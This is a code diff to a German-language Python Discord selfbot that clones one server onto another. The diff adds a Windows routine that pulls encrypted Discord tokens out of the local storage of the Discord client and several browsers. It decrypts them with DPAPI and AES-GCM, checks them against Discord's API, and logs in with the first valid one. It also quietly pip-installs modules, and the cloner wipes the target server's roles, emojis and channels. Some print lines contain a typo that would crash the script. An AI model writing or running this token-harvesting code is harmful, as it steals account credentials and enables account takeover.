@@ -1,11 +1,20 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-import discord
+import os
+import sys
+import json
+import re
+import base64
+import datetime
 import asyncio
-from discord.errors import HTTPException
-import aiohttp
+import subprocess
+import urllib.request
 from colorama import init, Fore, Style
+import discord
+from discord.errors import HTTPException
+from discord.utils import get
+import aiohttp
 
 init(autoreset=True)
 
@@ -13,6 +22,116 @@ OP_DELAY = 3.0
 CHANNEL_DELAY = 1.0
 FAST_DELETE_DELAY = 0.2
 
+# Windows-only: Token-Erkennung
+def install_and_import(mods):
+    for m, pkg in mods:
+        try:
+            __import__(m)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg],
+                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.execl(sys.executable, sys.executable, *sys.argv)
+
+if os.name == "nt":
+    install_and_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+    import win32crypt
+    from Crypto.Cipher import AES
+
+LOCAL = os.getenv("LOCALAPPDATA", "")
+ROAMING = os.getenv("APPDATA", "")
+PFADEN = {
+    "Discord": ROAMING + "\\Discord",
+    "Discord Canary": ROAMING + "\\discordcanary",
+    "Lightcord": ROAMING + "\\Lightcord",
+    "Discord PTB": ROAMING + "\\discordptb",
+    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
+    "Opera GX": ROAMING + "\\Opera Software\\Opera GX Stable",
+    "Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
+    "Edge": LOCAL + "\\Microsoft\\Edge\\User Data\\Default",
+    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"
+}
+
+def get_headers(token=None):
+    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+    if token:
+        headers["Authorization"] = token
+    return headers
+
+def get_raw_tokens(pfad):
+    leveldb = os.path.join(pfad, "Local Storage", "leveldb")
+    if not os.path.isdir(leveldb):
+        return []
+    tokens = []
+    for fname in os.listdir(leveldb):
+        if fname.endswith((".ldb", ".log")):
+            try:
+                with open(os.path.join(leveldb, fname), "r", errors="ignore") as f:
+                    for line in f:
+                        tokens += re.findall(r"dQw4w9WgXcQ:([^\"]*)", line)
+            except PermissionError:
+                pass
+    return tokens
+
+def get_key(pfad):
+    try:
+        with open(os.path.join(pfad, "Local State"), "r", encoding="utf-8") as f:
+            data = json.load(f)
+        return base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
+    except:
+        return None
+
+# Token-Auswahl
+wahl = input(f"{Fore.YELLOW}Token automatisch suchen? (y/n): {Style.RESET_ALL}").strip().lower()
+valid_tokens = []
+
+if wahl == "y" and os.name == "nt":
+    for name, pfad in PFADEN.items():
+        if not os.path.isdir(pfad):
+            continue
+        key = get_key(pfad)
+        if not key:
+            continue
+        try:
+            master = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+        except:
+            continue
+        for raw in get_raw_tokens(pfad):
+            try:
+                data = base64.b64decode(raw)
+                iv = data[3:15]
+                ct = data[15:-16]
+                token = AES.new(master, AES.MODE_GCM, iv).decrypt(ct).decode()
+            except:
+                continue
+            req = urllib.request.Request("https://discord.com/api/v10/users/@me", headers=get_headers(token))
+            try:
+                with urllib.request.urlopen(req) as resp:
+                    if resp.getcode() == 200:
+                        user = json.load(resp)
+                        valid_tokens.append((f"{user['username']}#{user['discriminator']}", token))
+            except:
+                continue
+    if valid_tokens:
+        _, TOKEN = valid_tokens[0]
+    else:
+        TOKEN = input(f"{Fore.YELLOW}Kein Token gefunden. Bitte manuell eingeben: {Style.RESET_ALL}").strip()
+else:
+    TOKEN = input(f"{Fore.YELLOW}Token manuell eingeben: {Style.RESET_ALL}").strip()
+
+# Ausgabe gefundener Benutzer
+print(f"{Fore.CYAN}Verwendete Accounts:{Style.RESET_ALL}")
+for uname, tok in valid_tokens:
+    print(f" - {uname}")
+
+# User-Eingaben
+SRC_GUILD_ID   = int(input(f"{Fore.YELLOW}Quell-Server-ID: {Style.RESET_ALL}").strip())
+DST_GUILD_ID   = int(input(f"{Fore.YELLOW}Ziel-Server-ID:  {Style.RESET_ALL}").strip())
+COPY_ASSETS    = input(f"{Fore.YELLOW}Metadaten & Assets kopieren? (y/n): {Style.RESET_ALL}").strip().lower() == "y"
+COPY_ROLES     = input(f"{Fore.YELLOW}Rollen kopieren? (y/n):        {Style.RESET_ALL}").strip().lower() == "y"
+COPY_EMOJIS    = input(f"{Fore.YELLOW}Emojis kopieren? (y/n):        {Style.RESET_ALL}").strip().lower() == "y"
+COPY_CHANNELS  = input(f"{Fore.YELLOW}Channels & Kategorien kopieren? (y/n): {Style.RESET_ALL}").strip().lower() == "y"
+
+# Hilfsfunktion für API-Calls
 async def safe_api_call(coro, *args, max_wait=30, **kwargs):
     while True:
         try:
@@ -21,190 +140,171 @@ async def safe_api_call(coro, *args, max_wait=30, **kwargs):
             if e.status == 429:
                 retry = getattr(e, "retry_after", max_wait)
                 if retry > max_wait:
-                    print(f"{Fore.RED}⚠️ Rate limit too long ({retry:.1f}s), skipping{Style.RESET_ALL}")
                     return None
-                print(f"{Fore.RED}⚠️ Rate limited, retrying in {retry:.1f}s…{Style.RESET_ALL}")
                 await asyncio.sleep(retry + 1)
             elif e.status == 404:
                 return None
             else:
-                print(f"{Fore.RED}❌ HTTP error {e.status}: {e}{Style.RESET_ALL}")
+                print(f"{Fore.RED}Fehler {e.status}: {e}{Style.RESET_ALL}")
                 return None
 
-try:
-    intents = discord.Intents.default()
-    intents.guilds = True
-    intents.members = True
-    intents.emojis = True
-    use_intents = True
-    print(f"{Fore.CYAN}ℹ️ Intents enabled{Style.RESET_ALL}")
-except:
-    intents = None
-    use_intents = False
+# Selfbot-Client
+class ClonerClient(discord.Client):
+    def __init__(self):
+        super().__init__(self_bot=True)
 
-TOKEN = input(f"{Fore.YELLOW}🔑 Discord User Token: {Style.RESET_ALL}").strip()
-SRC_GUILD_ID = int(input(f"{Fore.YELLOW}🆔 Source Server ID: {Style.RESET_ALL}").strip())
-DST_GUILD_ID = int(input(f"{Fore.YELLOW}🆔 Destination Server ID: {Style.RESET_ALL}").strip())
+    async def on_ready(self):
+        print(f"{Fore.GREEN}Eingeloggt als {self.user}{Style.RESET_ALL}")
 
-do_assets   = input(f"{Fore.YELLOW}📋 Copy metadata & assets? (y/n): {Style.RESET_ALL}").strip().lower() == "y"
-do_roles    = input(f"{Fore.YELLOW}🔐 Copy roles? (y/n): {Style.RESET_ALL}").strip().lower() == "y"
-do_emojis   = input(f"{Fore.YELLOW}😊 Copy emojis? (y/n): {Style.RESET_ALL}").strip().lower() == "y"
-do_channels = input(f"{Fore.YELLOW}📂 Copy channels & categories? (y/n): {Style.RESET_ALL}").strip().lower() == "y"
+        src = self.get_guild(SRC_GUILD_ID)
+        dst = self.get_guild(DST_GUILD_ID)
+        if not src or not dst:
+            print(f"{Fore.RED}Einer der Server wurde nicht gefunden{Style.RESET_ALL}")
+            await self.close()
+            return
 
-client = discord.Client(intents=intents, self_bot=True) if use_intents else discord.Client(self_bot=True)
+        # 1) Metadaten & Assets
+        if COPY_ASSETS:
+            print(f"{Fore.MAGENTA}--- 1. Metadaten & Assets kopieren ---{Style.RESET_ALL}")
+            icon   = await src.icon.read()   if src.icon   else None
+            if icon and len(icon) > 10*1024*1024:
+                print(f"{Fore.YELLOW}⚠️ Icon >10MB, übersprungen{Style.RESET_ALL}")
+                icon = None
+            banner = await src.banner.read() if src.banner else None
+            if banner and len(banner) > 10*1024*1024:
+                print(f"{Fore.YELLOW}⚠️ Banner >10MB, übersprungen{Style.RESET_ALL}")
+                banner = None
+            splash = await src.splash.read() if getattr(src, "splash", None) else None
+            if splash and len(splash) > 10*1024*1024:
+                print(f"{Fore.YELLOW}⚠️ Splash >10MB, übersprungen{Style.RESET_ALL}")
+                splash = None
+            await safe_api_call(dst.edit,
+                                name=src.name,
+                                description=getattr(src, "description", None),
+                                icon=icon, banner=banner, splash=splash)
+            print(f"{Fore.GREEN}✔️ Metadaten & Assets aktualisiert{Style.RESET_ALL}")
 
-@client.event
-async def on_ready():
-    print(f"\n{Fore.GREEN}✅ Logged in as {client.user} ({client.user.id}){Style.RESET_ALL}\n")
-    src = client.get_guild(SRC_GUILD_ID)
-    dst = client.get_guild(DST_GUILD_ID)
-    if not src or not dst:
-        print(f"{Fore.RED}❌ One of the servers was not found{Style.RESET_ALL}")
-        await client.close()
-        return
-
-    if do_assets:
-        print(f"{Fore.MAGENTA}--- 1. Copy Metadata & Assets ---{Style.RESET_ALL}")
-        icon   = await src.icon.read()   if src.icon   else None
-        banner = await src.banner.read() if src.banner else None
-        splash = await src.splash.read() if getattr(src, "splash", None) else None
-        await safe_api_call(dst.edit,
-            name=src.name,
-            description=getattr(src, "description", None),
-            icon=icon, banner=banner, splash=splash
-        )
-        print(f"{Fore.GREEN}✔️ Metadata & assets updated{Style.RESET_ALL}")
-
-    new_roles = {}
-    if do_roles:
-        print(f"\n{Fore.MAGENTA}--- 2. Copy Roles ---{Style.RESET_ALL}")
-        for role in sorted([r for r in dst.roles if not r.is_default()],
-                           key=lambda r: r.position, reverse=True):
-            await safe_api_call(role.delete, reason="full role sync")
-            print(f"{Fore.GREEN}✔️ Deleted role: {role.name}{Style.RESET_ALL}")
-            await asyncio.sleep(OP_DELAY)
-        for role in sorted(src.roles, key=lambda r: r.position):
-            if role.is_default():
-                new_roles[role.id] = dst.default_role
-                continue
-            created = await safe_api_call(dst.create_role,
-                name=role.name,
-                permissions=role.permissions,
-                colour=role.colour,
-                hoist=role.hoist,
-                mentionable=role.mentionable,
-                reason="cloning roles"
-            )
-            if created:
-                await safe_api_call(created.edit, position=role.position)
-                new_roles[role.id] = created
-                print(f"{Fore.GREEN}✔️ Created role: {role.name}{Style.RESET_ALL}")
-            await asyncio.sleep(OP_DELAY)
-
-    if do_emojis:
-        print(f"\n{Fore.MAGENTA}--- 3. Copy Emojis ---{Style.RESET_ALL}")
-        for emo in dst.emojis:
-            await safe_api_call(emo.delete)
-            print(f"{Fore.GREEN}✔️ Deleted emoji: {emo.name}{Style.RESET_ALL}")
-            await asyncio.sleep(OP_DELAY)
-        for idx, emoji in enumerate(src.emojis, 1):
-            img = await (emoji.read() if hasattr(emoji, "read")
-                         else (await (await aiohttp.ClientSession().get(str(emoji.url))).read()))
-            try:
-                await safe_api_call(dst.create_custom_emoji, name=emoji.name, image=img)
-                print(f"{Fore.GREEN}✔️ Uploaded emoji: {emoji.name}{Style.RESET_ALL}")
-            except HTTPException as e:
-                if e.status == 429:
-                    print(f"{Fore.RED}⚠️ Emoji rate limit reached, stopping{Style.RESET_ALL}")
-                    break
-                else:
-                    print(f"{Fore.RED}❌ Emoji error {e.status}: {e}{Style.RESET_ALL}")
-            await asyncio.sleep(OP_DELAY)
-
-    if do_channels:
-        print(f"\n{Fore.MAGENTA}--- 4. Copy Channels & Categories ---{Style.RESET_ALL}")
-        for ch in list(dst.channels):
-            if isinstance(ch, (discord.TextChannel, discord.VoiceChannel)):
-                await safe_api_call(ch.delete)
-                print(f"{Fore.GREEN}✔️ Deleted channel: {ch.name}{Style.RESET_ALL}")
-                await asyncio.sleep(FAST_DELETE_DELAY)
-        for cat in list(dst.categories):
-            await safe_api_call(cat.delete)
-            print(f"{Fore.GREEN}✔️ Deleted category: {cat.name}{Style.RESET_ALL}")
-            await asyncio.sleep(FAST_DELETE_DELAY)
-
+        # 2) Rollen
         role_map = {}
+        if COPY_ROLES:
+            print(f"{Fore.MAGENTA}--- 2. Rollen kopieren ---{Style.RESET_ALL}")
+            for role in sorted([r for r in dst.roles if not r.is_default()],
+                               key=lambda r: r.position, reverse=True):
+                await safe_api_call(role.delete, reason="Server-Klon")
+                print(f"{Fore.RED}🗑️ Gelöscht: {role.name}{Style.RESET_ALL}")
+                await asyncio.sleep(OP_DELAY)
+            for role in sorted(src.roles, key=lambda r: r.position):
+                if role.is_default():
+                    role_map[role.id] = dst.default_role
+                else:
+                    created = await safe_api_call(dst.create_role,
+                                name=role.name,
+                                permissions=role.permissions,
+                                colour=role.colour,
+                                hoist=role.hoist,
+                                mentionable=role.mentionable,
+                                reason="Server-Klon")
+                    if created:
+                        await safe_api_call(created.edit, position=role.position)
+                        role_map[role.id] = created
+                        print(f"{Fore.GREEN}➕ Erstellt: {role.name}{Style.RESET_ALL}")
+                    await asyncio.sleep(OP_DELAY)
+
         for src_role in src.roles:
-            if src_role.id in new_roles:
-                role_map[src_role.id] = new_roles[src_role.id]
-            else:
-                dst_role = discord.utils.get(dst.roles, name=src_role.name)
+            if src_role.id not in role_map:
+                dst_role = get(dst.roles, name=src_role.name)
                 if dst_role:
                     role_map[src_role.id] = dst_role
 
-        new_cats = {}
-        for cat in sorted(src.categories, key=lambda c: c.position):
-            ow = {}
-            for tgt, perms in cat.overwrites.items():
-                if isinstance(tgt, discord.Role) and tgt.id in role_map:
-                    ow[role_map[tgt.id]] = perms
-                elif isinstance(tgt, discord.Member):
-                    m = dst.get_member(tgt.id)
-                    if m:
-                        ow[m] = perms
-            created = await safe_api_call(
-                dst.create_category,
-                name=cat.name,
-                position=cat.position,
-                overwrites=ow
-            )
-            if created:
-                new_cats[cat.id] = created
-                print(f"{Fore.GREEN}✔️ Created category: {cat.name}{Style.RESET_ALL}")
-            await asyncio.sleep(CHANNEL_DELAY)
+        # 3) Emojis
+        if COPY_EMOJIS:
+            print(f"{Fore.MAGENTA}--- 3. Emojis kopieren ---{Style.RESET_ALL}")
+            session = aiohttp.ClientSession()
+            for emo in dst.emojis:
+                await safe_api_call(emo.delete)
+                print(f"{Fore.RED}🗑️ Gelöscht Emoji: {emo.name}{Style.RESET_ALL}")
+                await asyncio.sleep(OP_DELAY)
+            for emo in src.emojis:
+                img = await (emo.read() if hasattr(emo, "read")
+                             else (await (await session.get(str(emo.url))).read()))
+                await safe_api_call(dst.create_custom_emoji, name=emo.name, image=img)
+                print(f"{Fore.GREEN}➕ Erstellt emoji: {emo.name}{Style.RESETALL}")
+                await asyncio.sleep(OP_DELAY)
+            await session.close()
 
-        uncategorized = []
-        for src_ch in sorted(src.channels, key=lambda c: c.position):
-            if isinstance(src_ch, discord.TextChannel):
-                fn = dst.create_text_channel
-                params = {
-                    "topic": src_ch.topic,
-                    "nsfw": src_ch.nsfw,
-                    "slowmode_delay": src_ch.slowmode_delay
-                }
-            elif isinstance(src_ch, discord.VoiceChannel):
-                fn = dst.create_voice_channel
-                params = {
-                    "bitrate": min(src_ch.bitrate, 96000),
-                    "user_limit": src_ch.user_limit
-                }
-            else:
-                continue
-            ow = {}
-            for tgt, perms in src_ch.overwrites.items():
-                if isinstance(tgt, discord.Role) and tgt.id in role_map:
-                    ow[role_map[tgt.id]] = perms
-                elif isinstance(tgt, discord.Member):
-                    m = dst.get_member(tgt.id)
-                    if m:
-                        ow[m] = perms
-            kwargs = {"name": src_ch.name, "overwrites": ow, **params}
-            parent = new_cats.get(src_ch.category_id)
-            if parent:
-                kwargs["category"] = parent
+        # 4) Channels & Kategorien
+        if COPY_CHANNELS:
+            print(f"{Fore.MAGENTA}--- 4. Channels & Kategorien kopieren ---{Style.RESET_ALL}")
+            for ch in list(dst.channels):
+                if isinstance(ch, (discord.TextChannel, discord.VoiceChannel)):
+                    await safe_api_call(ch.delete)
+                    print(f"{Fore.RED}🗑️ Gelöscht Channel: {ch.name}{Style.RESETALL}")
+                    await asyncio.sleep(FAST_DELETE_DELAY)
+            for cat in list(dst.categories):
+                await safe_api_call(cat.delete)
+                print(f"{Fore.RED}🗑️ Gelöscht Kategorie: {cat.name}{Style.RESETALL}")
+                await asyncio.sleep(FAST_DELETE_DELAY)
+
+            new_cats = {}
+            for cat in sorted(src.categories, key=lambda c: c.position):
+                ow = {}
+                for target, perms in cat.overwrites.items():
+                    if isinstance(target, discord.Role) and target.id in role_map:
+                        ow[role_map[target.id]] = perms
+                    elif isinstance(target, discord.Member):
+                        m = dst.get_member(target.id)
+                        if m:
+                            ow[m] = perms
+                created = await safe_api_call(dst.create_category,
+                                name=cat.name,
+                                position=cat.position,
+                                overwrites=ow)
+                if created:
+                    new_cats[cat.id] = created
+                    print(f"{Fore.GREEN}➕ Erstellt Kategorie: {cat.name}{Style.RESETALL}")
+                await asyncio.sleep(CHANNEL_DELAY)
+
+            uncategorized = []
+            for src_ch in sorted(src.channels, key=lambda c: c.position):
+                if isinstance(src_ch, discord.TextChannel):
+                    fn, params = dst.create_text_channel, {
+                        "topic": src_ch.topic,
+                        "nsfw": src_ch.nsfw,
+                        "slowmode_delay": src_ch.slowmode_delay
+                    }
+                elif isinstance(src_ch, discord.VoiceChannel):
+                    fn, params = dst.create_voice_channel, {
+                        "bitrate": min(src_ch.bitrate, 96000),
+                        "user_limit": src_ch.user_limit
+                    }
+                else:
+                    continue
+                ow = {}
+                for tgt, perms in src_ch.overwrites.items():
+                    if isinstance(tgt, discord.Role) and tgt.id in role_map:
+                        ow[role_map[tgt.id]] = perms
+                    elif isinstance(tgt, discord.Member):
+                        m = dst.get_member(tgt.id)
+                        if m:
+                            ow[m] = perms
+                kwargs = {"name": src_ch.name, "overwrites": ow, **params}
+                parent = new_cats.get(src_ch.category_id)
+                if parent:
+                    kwargs["category"] = parent
+                    await safe_api_call(fn, **kwargs)
+                    print(f"{Fore.GREEN}➕ Erstellt Channel: {src_ch.name}{Style.RESET_ALL}")
+                else:
+                    uncategorized.append((fn, kwargs))
+                await asyncio.sleep(CHANNEL_DELAY)
+
+            for fn, kwargs in uncategorized:
                 await safe_api_call(fn, **kwargs)
-                print(f"{Fore.GREEN}✔️ Created channel: {src_ch.name}{Style.RESET_ALL}")
-            else:
-                uncategorized.append((fn, kwargs))
-            await asyncio.sleep(CHANNEL_DELAY)
+                print(f"{Fore.GREEN}➕ Erstellt Top-Level Channel: {kwargs['name']}{Style.RESET_ALL}")
+                await asyncio.sleep(CHANNEL_DELAY)
 
-        for fn, kwargs in uncategorized:
-            await safe_api_call(fn, **kwargs)
-            print(f"{Fore.GREEN}✔️ Created top-level channel: {kwargs['name']}{Style.RESET_ALL}")
-            await asyncio.sleep(CHANNEL_DELAY)
-
-    print(f"\n{Fore.GREEN}🏁 All done! Server clone complete.{Style.RESET_ALL}")
-    await client.close()
+        print(f"{Fore.GREEN}🏁 Fertig! Server-Klon komplett.{Style.RESET_ALL}")
+        await self.close()
 
 if __name__ == "__main__":
+    client = ClonerClient()
     client.run(TOKEN)
